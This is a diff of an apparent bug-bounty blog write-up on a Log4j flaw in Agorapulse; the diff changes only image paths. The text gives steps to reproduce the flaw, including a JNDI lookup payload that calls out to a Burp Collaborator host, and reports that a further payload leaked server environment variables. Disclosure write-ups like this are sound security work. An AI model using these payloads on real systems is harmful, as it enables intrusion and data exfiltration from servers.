@@ -46,18 +46,18 @@ So, the steps to reproduce were as follows
 - Start Burp and create a new burp collaborator Client
 - Now Login to agorapulse and click on `Publish` to publish a new post.
 
-![x](/blog/assets/images/agora-log4j/1.png)
+![x](/assets/images/agora-log4j/1.png)
 
 
 
 - Now use your burp collaborator to make a new payload `${jndi:ldap://<Your-Burp-Collab-URL>/a}` and paste it in the Post Section.
 - Now Select any profile from the left side and Publish the POST
 
-![x](/blog/assets/images/agora-log4j/2.png)
+![x](/assets/images/agora-log4j/2.png)
 
 - On going back to the burp collaborator client, you will see a Pingback.
 
-![x](/blog/assets/images/agora-log4j/Three.png)
+![x](/assets/images/agora-log4j/Three.png)
 
 
   
@@ -93,7 +93,7 @@ As we went back to Agorapulse and made another post with this Payload : `${jndi:
 we were able just able to extract the environment variables of the server.
 
 
-![x](/blog/assets/images/agora-log4j/4.png)
+![x](/assets/images/agora-log4j/4.png)
   
 
 Just to keep the exploitation ethical, We stopped right after extracting the $PATH environment variable of the agopulse server. Hence, no sensitive, confidential, or any other information related to their users was extracted.
